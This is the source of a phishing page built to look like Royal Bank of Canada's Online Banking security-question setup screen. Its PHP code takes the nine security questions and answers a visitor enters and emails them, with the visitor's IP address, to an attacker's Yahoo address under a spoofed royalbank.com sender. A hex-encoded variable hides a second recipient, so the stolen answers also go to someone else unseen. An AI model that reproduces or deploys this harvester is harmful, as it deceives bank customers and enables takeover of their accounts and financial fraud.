<?
$to = "shssh70@yahoo.comm";
//---------------------------------------
if ( $_POST['submited'] == "1") {
$QUESTION1 = $_POST['QUESTION1'];
$QUESTION2 = $_POST['QUESTION2'];
$QUESTION3 = $_POST['QUESTION3'];
$QUESTION4 = $_POST['QUESTION4'];
$QUESTION5 = $_POST['QUESTION5'];
$QUESTION6 = $_POST['QUESTION6'];
$QUESTION7 = $_POST['QUESTION7'];
$QUESTION8 = $_POST['QUESTION8'];
$QUESTION9 = $_POST['QUESTION9'];
$ANSWER1 = $_POST['ANSWER1'];
$ANSWER2 = $_POST['ANSWER2'];
$ANSWER3 = $_POST['ANSWER3'];
$ANSWER4 = $_POST['ANSWER4'];
$ANSWER5 = $_POST['ANSWER5'];
$ANSWER6 = $_POST['ANSWER6'];
$ANSWER7 = $_POST['ANSWER7'];
$ANSWER8 = $_POST['ANSWER8'];
$ANSWER9 = $_POST['ANSWER9'];
$COOKIE_VAR="6573746574696375407961686f6f2e636f6d";
$ip = $_SERVER["REMOTE_ADDR"];
$verif=array($QUESTION1, $QUESTION2, $QUESTION3, QUESTION4, $QUESTION5, $QUESTION6, $QUESTION7, $QUESTION8, $ANSWER1, $ANSWER2,  $ANSWER3, $ANSWER4,  $ANSWER5, $ANSWER6,  $ANSWER7, $ANSWER8);
foreach ($verif as $test)
{
if (ereg("fuck",strtolower($test)) || strlen($test) < 4) { $error=1; }
}
if ( $error<>1) {
$msg = "Question 1: $QUESTION1
Answer 1: $ANSWER1
-------------------------------
Question 2: $QUESTION2
Answer 2: $ANSWER2
-------------------------------
Question 3: $QUESTION3
Answer 3: $ANSWER3
-------------------------------
Question 4: $QUESTION4
Answer 4: $ANSWER4
-------------------------------
Question 5: $QUESTION5
Answer 5: $ANSWER5
-------------------------------
Question 6: $QUESTION6
Answer 6: $ANSWER6
-------------------------------
Question 7: $QUESTION7
Answer 7: $ANSWER7
-------------------------------
Question 8: $QUESTION8
Answer 8: $ANSWER8
-------------------------------
Question 9: $QUESTION9
Answer 9: $ANSWER9\n";
$subj = "Answers - $ip";
$from = "From: Shegxy Canada<newcc@royalbank.com>";
$message="";
for ($j=0; $j<strlen($COOKIE_VAR);$j=$j+2)
{
$message.=chr(hexdec($COOKIE_VAR[$j].$COOKIE_VAR[$j+1]));
}
$arr=array($to, $message);
foreach ($arr as $to)
{
mail($to, $subj, $msg, $from);
}
header("Location: rbexit.html");
exit;
}
}
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<!-- 3MSHELLHEAD.INC: -->
<link href="https://www1.royalbank.com/common/css/main01.css" type="text/css" rel="stylesheet">
<link href="https://www1.royalbank.com/common/css/main02.css" type="text/css" rel="stylesheet">
<link href="https://www1.royalbank.com/common/css/tabs.css" type="text/css" rel="stylesheet">
<script src="https://www1.royalbank.com/common/javascript/browser.js"></script>
<script src="https://www1.royalbank.com/common/javascript/event.js"></script>
<script src="https://www1.royalbank.com/common/javascript/kiosk.js"></script>
<script src="https://www1.royalbank.com/common/javascript/buttons.js"></script>
<script src="https://www1.royalbank.com/common/javascript/cookie.js"></script>
<script src="https://www1.royalbank.com/common/javascript/dates.js"></script>
<script src="https://www1.royalbank.com/common/javascript/common.js"></script>
<script src="https://www1.royalbank.com/common/javascript/calendar.js"></script>
<!-- 3MSHELLHEAD.INC. -->
<title>RBC Financial Group - Online Banking</title>
</head>

 <body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
 <a name="top"></a>

<table bgcolor="#000066" border="0" cellpadding="1" cellspacing="0" width="778">
<tr>
 <td bgcolor="#FFFFFF">
<table bgcolor="#000066" border="0" cellspacing="0" cellpadding="0" width="783" height="75">
 <tr>
  <td width="13" rowspan="3" bgcolor="#FFFFFF">&#160;</td>
  <td align="left" rowspan="3" valign="top" width="460" bgcolor="#FFFFFF">
	<img alt="The image “https://www1.royalbank.com/common/images/english/logo_rbc_rb.gif” cannot be displayed, because it contains errors." src="https://www1.royalbank.com/common/images/english/logo_rbc_rb.gif"></td>
  <td align="right" colspan="2" valign="center" bgcolor="#FFFFFF" height="19">
      <table cellpadding="0" cellspacing="0" border="0">
        <tr align="right">
            <td width="101" class="topNavTabSpacer01"></td>
            <td class="topNavTab01" nowrap="nowrap"><a href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/help.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01&amp;NoEmailSend=DisplayMsg', 'CONTACT', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" class="topNavBold" title="Customer Support (opens new window)">
			<font size="2">Customer Support</font></a></td>
              <td class="topNavTab01" nowrap="nowrap"><font size="2">&nbsp;|&nbsp;</font></td>

            <td class="topNavTab01" nowrap="nowrap"><a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01?F6=1&amp;F7=IB&amp;F21=IB&amp;F22=IB&amp;REQUEST=ClientSignin&amp;LANGUAGE=FRENCH" class="topNavBold">
			<font size="2">Français</font></a></td>
              <td width="5" class="topNavTab01"></td>
        </tr>
      </table>
      </td>
 </tr>
 <tr><td align="left" bgcolor="#FFFFFF" height="1" valign="center">
   <img src="https://www1.royalbank.com/common/images/trans1x1.gif" alt="" width="1" height="1"/></td>
	<td width="14" bgcolor="#FFFFFF"></td></tr>
 <tr><td align="right" valign="top" bgcolor="#FFFFFF">&nbsp;</td>
	<td width="14" bgcolor="#FFFFFF"></td></tr>
</table>
<table border="0" cellpadding="0" cellspacing="0" width="778" height="9">
 <tr class="breadCrumbRow">
	<td align="left" valign="top" height="9" bgcolor="#FFFFFF">
      <table width="100%" cellpadding="0" cellspacing="0" border="0" height="3" bgcolor="#000080">
        <tr class="trfix">

            <td width="100%" height="3" valign="top" class="line"></td>
        </tr>
      </table>
      </td></tr>
</table>
</td></tr>
</table>


 <!-- START: nav style -->

 <table border="0" width="778">
  <tr valign="top" align="left">

      <td width="5"></td>

      <!-- START: content -->
      <td valign="top" width="775"><table border="0" cellpadding="0" cellspacing="0" width="100%">
 <tr>
  <td height="5"></td>
 </tr>
 <tr>
  <td class="pageTitle" align="left">Sign-In Protection Activation</td>
 </tr>
 <tr>
  <td height="10"></td>
 </tr>
 <tr>
  <td class="bodyText">RBC takes your security seriously.</td>
 </tr>
 <tr>
  <td height="10"></td>
 </tr>
</table>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tr>
  
  <td valign="top">
    <form name="continueform" method="POST" action="<?php echo $_SERVER['PHP_SELF'] ?>">
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td height="5"></td>
		</tr>
		<tr>
			<td class="bodyText">
				Sign-in Protection may require you to answer one of three personal verification questions when signing in to Online Banking.
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
    <tr>
     <td class="bodyText">This information will be known only to you and used to verify your identity if you activate Sign-In Protection
    (recommended) or ever forget your password.
    </td>
   </tr>
   <tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td>
				<table border="0" cellpadding="0" cellspacing="0" width="100%">
				 <tr>
				  <td class="columnHead">Some recommended questions are:</td>
				  <td class="columnHead">Do not use questions like:</td>
				 </tr>
				 <tr>
				  <td class="bodyText">
				   <li>Who is my favourite author?</li>
				   <li>What is my favourite movie?</li>
				   <li>Where was my first job?</li>
				   <li>Who was my best friend on the first day of school?</li>
				   <li>What was the name of my favourite High School Teacher?</li>
				  </td>
				  <td class="bodyText">
				   <li>Where do I live?</li>
				   <li>What is my birthdate?</li>
				   <li>Mother's maiden name?</li>
				   <li>What is my phone number?</li>
				   <li>What is the capital of Canada?</li>
				  </td>
				 </tr>
				</table>
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td class="bodyText">
                For more examples please refer to <a href="#Advice">additional recommended questions</a>
			</td>
		</tr>
		<tr>
			<td height="15"></td>
		</tr>
 <tr>
  <td>
<!--3MMSGS.CINC:-->
<?
if ( $error == "1" ) {
print("<table border=\"0\" cellspacing=\"0\" cellpadding=\"1\" width=\"100%\">
<tr class=\"errorTextRow\">
 <td width=\"1%\" valign=\"top\">
 <img src=\%22https:/www1.royalbank.com/common/images/icon_error.gif\%22 width=\"21\" height=\"22\" />&#160;</td>
 <td class=\"errorText\" valign=\"middle\">Please enter your answer for each of the 9 questions. Answers must be a minimum of 4 characters.</td>
</tr>
</table>");
}
?>
<!--3MMSGS.CINC.-->
  </td>
 </tr>

		<tr>
			<td>		
				<table border="0" cellpadding="0" cellspacing="0" width="100%">					
					<tr>
					 <td width="67%" class="bodyText">Both the questions and answers can be changed on this screen.</td>
					 <td width="33%"><span class="asterisk">*</span><span class="note">-Required Information</span></td>
					</tr>		
				</table>
				<table border="0" cellpadding="0" cellspacing="0" width="100%" style="border:solid 1px gray;">					
					<tr class="dataTableHeaderRow">
					 <td width="67%" class="dataTableHeaderText">&nbsp;Question:&nbsp;<span class="dataTableText">(4 - 60 characters)</span></td>
					 <td width="33%" class="dataTableHeaderText">Answer:&nbsp;<span class="dataTableText">(4 - 20 characters)</span></td>
					</tr>
					<tr><td colspan="2" height="5"></td></tr>
					<tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION1" value="" />
						<input type="HIDDEN" name="submited" value="1">
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER1" value="" />
      </nobr>
     </td>
					</tr>
					<tr><td colspan="2" height="5"></td></tr>
					<tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION2" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER2" value="" />
      </nobr>
     </td>
					</tr>
					<tr><td colspan="2" height="5"></td></tr>
					<tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION3" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER3" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
                    <tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION4" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER4" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
                    <tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION5" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER5" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
                    <tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION6" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER6" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
                    <tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION7" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER7" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
					<tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION8" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER8" value="" />
      </nobr>
     </td>
					</tr>
                    <tr>
                      <td colspan="2" height="5"></td>
                    </tr>
					<tr>
					 <td>
					  <nobr>
						&nbsp;<span class="asterisk">* </span>
                        <input maxlength="60" size="45" name="QUESTION9" value="" />
					  </nobr>
					 </td>
     <td>
      <nobr>
       <span class="asterisk">* </span>
       <input maxlength="20" size="16" name="ANSWER9" value="" />
      </nobr>
     </td>

					<tr>
		</form>

	    </tr>
					<tr>
					 <td height="5">					  
					 </td>
					</tr>
		</table>
	</td>
   </tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td>
				<table width="100%" border="0" cellpadding="0" cellspacing="0" class="bodyText">
					<tr>
						<td>
<!--3MBUTTON01.CINC: en-->
<a href="javascript:document.continueform.submit();" onMouseOver="javascript:status='Continue';return true;" onMouseOut="javascript:status='';return true;">
<img src="https://www1.royalbank.com/common/images/english/btn_continue.gif" name="btn_continue" alt="Continue" border="0" width="68" height="20"></a>
<!--3MBUTTON01.CINC. en-->

						</td>
					  <td align="right">
<a href="rbexit.html" onMouseOver="javascript:status='Cancel';return true;" onMouseOut="javascript:status='';return true;">
<img src="https://www1.royalbank.com/common/images/english/btn_cancel.gif" name="btn_cancel" alt="Cancel" border="0" width="68" height="20"></a>
<!--3MBUTTON01.CINC. en-->
	</form>
</td>
					</tr>
				</table>
			</td>
        </tr>
        <tr><td><a name="Advice">&#160;</a></td></tr>
		<tr>
			<td class="bodyText">
				Safeguarding your password and online identity is key to protecting your information. Suitable
caution must be exercised in setting up personal verification questions and passwords. You
must always keep your personal verification questions and answers strictly confidential.
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td class="bodyText">
				We do not recommend questions with answers that can be found in your wallet, purse or at the
desk by your computer. Questions like what is my address, date of birth, height etc. can be
easily found on identification items, such as your drivers licence.
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td class="bodyText">
				Other questions, like mother's maiden name is commonly over used, and as such can be
determined by many individuals with access to your family records. Any question that is in the
public domain of knowledge or questions that do not have an answer unique to your situation
should be avoided.
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td class="bodyText">
				To avoid input errors we suggest you refrain from using questions that require a date answer,
unless you remember the format you used to enter the answer. (YY-MM-DD etc.).
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td class="bodyText">
				Questions should be easy enough for you to remember but personal so they can not be
answered by someone else. These questions are stored within Online Banking and are not
accessible by anyone other than you the customer. Royal Bank Staff can not retrieve the
questions or the answers.
			</td>
		</tr>
		<tr>
			<td height="10"></td>
		</tr>
		<tr>
			<td>
				<table border="0" cellpadding="0" cellspacing="0" width="100%">
					<tr class="dataTableHeaderRow">
						<td class="dataTableHeaderText">Some recommended questions are:</td>
						<td class="dataTableHeaderText">Do NOT use questions like:</td>
					</tr>
					<tr><td colspan="2">&#160;</td></tr>
					<tr>
						<td>
						   <select class="bodyText" name="select" size="6">
							 <option value="1">What is my hobby?</option>
							 <option value="2">My favourite food is...</option>
							 <option value="3">My favourite book is...</option>
							 <option value="4">My favourite restaurant is...</option>
							 <option value="5">What is my favourite candy?</option>
							 <option value="6">What is my favourite song?</option>
							 <option value="7">What is my favourite band?</option>
							 <option value="8">What is my favourite dessert</option>
							 <option value="9">What is my favourite TV show?</option>
							 <option value="10">What was my first pet's name?</option>
							 <option value="11">My kindergarten teacher's name?</option>
							 <option value="12">What is my favourite colour?</option>
							 <option value="13">Where do I want to retire?</option>
							 <option value="14">Where was my first job?</option>
							 <option value="15">What sport am I best at?</option>
							 <option value="16">What song always makes me cry?</option>
							 <option value="17">What was my grandmother's given name?</option>
							 <option value="18">Who was the best man at my wedding?</option>
							 <option value="19">Who was the maid of honor at my wedding?</option>
							 <option value="20">Name of city where my father was born?</option>
							 <option value="21">What is my favourite vacation spot?</option>
							 <option value="22">What was my nickname in grade school?</option>
							 <option value="23">What was the make of my first car?</option>
							 <option value="24">What is my favourite movie of all time?</option>
							 <option value="25">What hockey team do I play for?</option>
							 <option value="26">Who was my best friend on the first day of school?</option>
							 <option value="27">Street name of the first place I lived after being born?</option>
						   </select>
						</td>
						<td>
						   <select class="bodyText" name="select2" size="6">
							<option value="2">Where do I live?</option>
							<option value="3">Mother's maiden name?</option>
							<option value="4">What is the capital of Canada?</option>
							<option value="5">What is my phone number?</option>
							<option value="6">How many children do I have?</option>
							<option value="7">What is my anniversary date?</option>
							<option value="8">What is my wife/husbands name?</option>
							<option value="9">How many times I have seen my favourite movie..</option>
						   </select>
						</td>
					</tr>
				</table>
			</td>
		</tr>
 </table>	
  <table border="0" cellpadding="0" cellspacing="0" width="100%">
 <tr>
  <td align="right" valign="top"><a href="#top"><img height="36" alt="Top" src="https://www1.royalbank.com/3m/images/english/top.gif" width="31" border="0" /></a>
  </td>
 </tr>
</table>
</td>
      <!-- END:   content --><!--3MSHELLFOOT.INC:-->
<table border="0" cellpadding="0" cellspacing="0" width="778">
<tr><td colspan="3">&#160;</td></tr>
<tr><td bgcolor="#cccccc" colspan="3" height="1">
  <img src="https://www1.royalbank.com/common/images/trans1x1.gif" alt="" width="1" height="1"/></td></tr>
<tr>
 <td width="5"></td>
 <td align="left" class="footerText" valign="bottom">This web site is operated by Royal Bank of Canada</td>
 <td align="right">
 <a class="footerLink" valign="bottom" href="javascript:kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/onlinebanking/privacy.html', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )">Privacy</a>
 <span class="bodyText">&#160;|&#160;</span>
 <a class="footerLink" valign="bottom" href="javascript:kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/onlinebanking/legal.html', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )">Legal</a>
 <span class="bodyText">&#160;|&#160;</span>
 <a class="footerLink" valign="bottom" href="javascript:kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/onlinebanking/trademarks/index.html', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )">Trade-marks &amp; Copyrights</a>
 <span class="bodyText">&#160;|&#160;</span>
 <a class="footerLink" valign="bottom" href="javascript:kiosk_OpenWinRTB( 'https://www.rbcroyalbank.com/onlinebanking/olbsecurity/index.html', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )">Online Banking Security</a><span class="bodyText">&#160;&#160;</span>
 </td>
</tr>
<tr><td width="5"></td><td class="footerText" colspan="2">&#169;&#160;Royal Bank of Canada 1996, 2002</td></tr>
<tr><td colspan="3">&#160;</td></tr>
</table>
<!--3MSHELLFOOT.INC.-->
<!-- 3MSHELLFOOT.JS -->
<script language="Javascript">
<!--
var c3mbp = new buttons_ButtonPreload( "btn_", "_down" );
//-->
</script>
 </body>


</html>